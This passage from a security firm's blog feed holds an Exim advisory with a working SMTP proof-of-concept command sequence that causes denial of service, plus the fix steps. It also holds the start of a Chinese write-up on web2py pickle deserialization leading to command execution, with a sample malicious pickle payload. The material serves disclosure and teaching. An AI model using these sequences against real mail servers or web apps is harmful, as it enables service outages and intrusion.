&lt;p&gt;When receiving data with BDAT command, SMTP server should not consider a single dot &lt;code class=&quot;highlighter-rouge&quot;&gt;‘.’&lt;/code&gt; in a line to be the end of message. However, we found exim does in receive_msg when parsing header. Like the following output:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;220 devco.re ESMTP Exim 4.90devstart_213-7c6ec81-XX Mon, 27 Nov 2017 16:58:20 +0800
EHLO test
250-devco.re Hello root at test
250-SIZE 52428800
250-8BITMIME
250-PIPELINING
250-AUTH PLAIN LOGIN CRAM-MD5
250-CHUNKING
250-STARTTLS
250-PRDR
250 HELP
MAIL FROM:&amp;lt;meh@some.domain&amp;gt;
250 OK
RCPT TO:&amp;lt;meh@some.domain&amp;gt;
250 Accepted
BDAT 10
.
250- 10 byte chunk, total 0
250 OK id=1eJFGW-000CB0-1R
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As we mentioned before, exim uses function pointers to switch input source. This bug makes exim go into an incorrect state because the function pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt; is not reset. If the next command is also a BDAT, &lt;code class=&quot;highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;lwr_receive_getc&lt;/code&gt; become the same and an infinite loop occurs inside &lt;code class=&quot;highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt;. Program crashes due to stack exhaustion.&lt;br /&gt;
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L546&quot;&gt;smtp_in.c: 546 bdat_getc&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  if (chunking_data_left &amp;gt; 0)
    return lwr_receive_getc(chunking_data_left--);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This is not enough to pose a threat because exim runs a fork server. After a further analysis, we made exim go into an infinite loop without crashing, using the following commands.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# CVE-2017-16944 PoC by meh at DEVCORE

EHLO localhost
MAIL FROM:&amp;lt;meh@some.domain&amp;gt;
RCPT TO:&amp;lt;meh@some.domain&amp;gt;
BDAT 100
.
MAIL FROM:&amp;lt;meh@some.domain&amp;gt;
RCPT TO:&amp;lt;meh@some.domain&amp;gt;
BDAT 0 LAST
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This makes attackers able to launch a resource based DoS attack and then force the whole server down.&lt;/p&gt;

&lt;h2 id=&quot;fix&quot;&gt;Fix&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Turn off Chunking option in config file:
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chunking_advertise_hosts =
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Update to 4.89.1 version&lt;/li&gt;
  &lt;li&gt;Patch of CVE-2017-16943 released &lt;a href=&quot;https://git.exim.org/exim.git/commitdiff/4090d62a4b25782129cc1643596dc2f6e8f63bde&quot;&gt;here&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Patch of CVE-2017-16944 released &lt;a href=&quot;https://git.exim.org/exim.git/commitdiff/178ecb70987f024f0e775d87c2f8b2cf587dd542&quot;&gt;here&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;23 November, 2017 09:40 Report to Exim Bugzilla&lt;/li&gt;
  &lt;li&gt;25 November, 2017 16:27 CVE-2017-16943 Patch released&lt;/li&gt;
  &lt;li&gt;28 November, 2017 16:27 CVE-2017-16944 Patch released&lt;/li&gt;
  &lt;li&gt;3 December, 2017 13:15 Send an advisory release notification to Exim and wait for reply until now&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;remarks&quot;&gt;Remarks&lt;/h4&gt;
&lt;p&gt;While we were trying to report these bugs to exim, we could not find any method for security report. Therefore, we followed the link on the official site for bug report and found the security option. Unexpectedly, the Bugzilla posts all bugs publicly and therefore the PoC was leaked. Exim team responded rapidly and improved their security report process by adding a notification for security reports in reaction to this.&lt;/p&gt;

&lt;h2 id=&quot;credits&quot;&gt;Credits&lt;/h2&gt;
&lt;p&gt;Vulnerabilities found by Meh, DEVCORE research team.&lt;br /&gt;
meh [at] devco [dot] re&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;p&gt;https://bugs.exim.org/show_bug.cgi?id=2199&lt;br /&gt;
https://bugs.exim.org/show_bug.cgi?id=2201&lt;br /&gt;
https://nvd.nist.gov/vuln/detail/CVE-2017-16943&lt;br /&gt;
https://nvd.nist.gov/vuln/detail/CVE-2017-16944&lt;br /&gt;
https://lists.exim.org/lurker/message/20171125.034842.d1d75cac.en.html&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/</link>
                <guid>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en</guid>
                <pubDate>Mon, 11 Dec 2017 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Exim RCE 資安通報 (CVE-2017-16943)</title>
                <description>&lt;h2 id=&quot;內容&quot;&gt;內容&lt;/h2&gt;

&lt;p&gt;2017/11/23 我們發現 Unix 的開源軟體 EXIM 含有 Use-After-Free 弱點（CVE-2017-16943）以及 Denial-of-Service 弱點（CVE-2017-16944），&lt;strong&gt;當 EXIM 版本是 4.88 或 4.89 並且有開啟 chunking 選項（BDAT 指令）時&lt;/strong&gt;，攻擊者可傳送特定字串給 EXIM 觸發弱點，可能造成郵件伺服器被&lt;strong&gt;遠端攻擊者入侵&lt;/strong&gt;或是&lt;strong&gt;郵件伺服器無法繼續提供服務&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;根據 E-Soft Inc. 在 11 月所做的調查，約有 57萬台（56%）的郵件伺服器使用 EXIM 軟體。建議 EXIM 的使用者檢查版本是否為 4.88 或 4.89，若是，則需修改 EXIM 的設定，將 chunking 選項&lt;strong&gt;關閉&lt;/strong&gt;（在 config 裡將 &lt;code class=&quot;highlighter-rouge&quot;&gt;chunking_advertise_hosts&lt;/code&gt; 選項留空），或是&lt;strong&gt;更新至 4.89.1 版&lt;/strong&gt;，以避免遭受攻擊。&lt;/p&gt;

&lt;h2 id=&quot;細節&quot;&gt;細節&lt;/h2&gt;

&lt;p&gt;詳細的技術細節請參閱我們的 Advisory：&lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/&quot;&gt;https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/&lt;/a&gt;&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943/</link>
                <guid>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943</guid>
                <pubDate>Mon, 11 Dec 2017 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>WEB2PY 反序列化的安全問題－CVE-2016-3957</title>
                <description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;在一次滲透測試的過程中，我們遇到了用 web2py 框架建構的應用程式。為了成功滲透目標，我們研究了 web2py，發現該框架範例應用程式中存在三個資訊洩漏問題，這些洩漏都會導致遠端命令執行 (RCE)。由於範例應用程式預設是開啟的，若沒有手動關閉，攻擊者可以直接利用洩漏資訊取得系統執行權限。這些問題編號分別為：CVE-2016-3952、CVE-2016-3953、CVE-2016-3954、CVE-2016-3957。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;背景老生常談的-pickle-code-execution&quot;&gt;背景－老生常談的 Pickle Code Execution&lt;/h3&gt;

&lt;p&gt;在繼續說明前必須要先認知什麼是反序列化的安全問題？反序列化的安全問題在本質上其實是物件注入，它的嚴重性取決於所注入的物件本身是否會造成危險行為，例如讀寫檔。一般來說要透過反序列化建構一個成功的攻擊有兩個要點：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;是否可控制目標所要反序列化的字串。&lt;/li&gt;
  &lt;li&gt;危險行為在反序列化後是否會被執行。這在實務上大概有下面兩種情形：
    &lt;ul&gt;
      &lt;li&gt;危險行為是寫在魔法方法 (Magic Method) 裡面，例如 PHP 的 __construct 在物件生成時一定會執行。&lt;/li&gt;
      &lt;li&gt;反序列化後覆蓋既有物件，導致正常程式流程出現危險結果。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;反序列化的問題在每個程式語言都會發生，但通常需要搭配看程式碼拼湊出可以用的攻擊流程，比較難利用。不過，某些實作序列化的函式庫會將程式邏輯也序列化成字串，因此攻擊者可以自定義物件直接使用，不再需要拼湊，例如今天要提的 Python Pickle。&lt;/p&gt;

&lt;p&gt;直接舉個 Pickle 的例子如下，我們製造了一個會執行系統指令 &lt;code class=&quot;highlighter-rouge&quot;&gt;echo success&lt;/code&gt; 的物件 &lt;code class=&quot;highlighter-rouge&quot;&gt;Malicious&lt;/code&gt;，並且序列化成字串 &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;cposix\nsystem\np1\n(S&#39;echo success&#39;\np2\ntp3\nRp4\n.&quot;&lt;/code&gt;。當受害者反序列化這個字串，即觸發執行該系統指令，因此印出 &lt;code class=&quot;highlighter-rouge&quot;&gt;success&lt;/code&gt;。&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cPickle&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Malicious&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reduce__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;echo success&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cPickle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Malicious&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialize&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;quot;cposix&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;(S&amp;#39;echo success&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;tp3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Rp4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.&amp;quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cPickle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;這就是 Pickle 誤用反序列化所造成的命令執行風險。攻擊者很容易可以產生一個含有任意命令執行的序列化字串，進而讓受害者在進行反序列化的過程中觸發執行惡意命令。&lt;/p&gt;

&lt;h3 id=&quot;反序列化--序列化字串可控&quot;&gt;反序列化 ＋ 序列化字串可控&lt;/h3&gt;

&lt;p&gt;本次發現的問題主要來自 web2py 本身的 session cookie 使用 Pickle 處理序列化需求 (CVE-2016-3957)，而且因為 session cookie 的加密字串固定 (CVE-2016-3953)，攻擊者可任意偽造惡意的序列化字串造成前面所介紹的命令執行風險。細節如下。&lt;/p&gt;

&lt;h4 id=&quot;cve-2016-3957&quot;&gt;CVE-2016-3957&lt;sup id=&quot;fnref:note1&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/h4&gt;

&lt;p&gt;web2py 的應用程式如果使用 cookie 來儲存 session 資訊，那麼在每次接到使用者請求時會將 session cookie 用一個 secure_loads 函式將 cookie 內容讀入。 [&lt;a href=&quot;https://github.com/web2py/web2py/blob/R-2.14.1/gluon/globals.py#L846&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;gluon/globals.py#L846&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_storage_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;cookie&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;# check if there is session data in cookies&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_data_name&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_data_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secure_loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                    &lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;secure_loads 函式內容如下，在一連串解密後會用 pickle.loads 方法將解密內容反序列化，在這裡確定 cookie 內容會使用 Pickle 處理。[&lt;a href=&quot;https://github.com/web2py/web2py/blob/R-2.14.1/gluon/utils.py#L200&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;gluon/utils.py#L200&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;secure_loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encryption_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;:&amp;#39;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sha1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encryption_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;actual_signature&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actual_signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encryption_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlsafe_b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AES_new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rstrip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zlib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decompress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
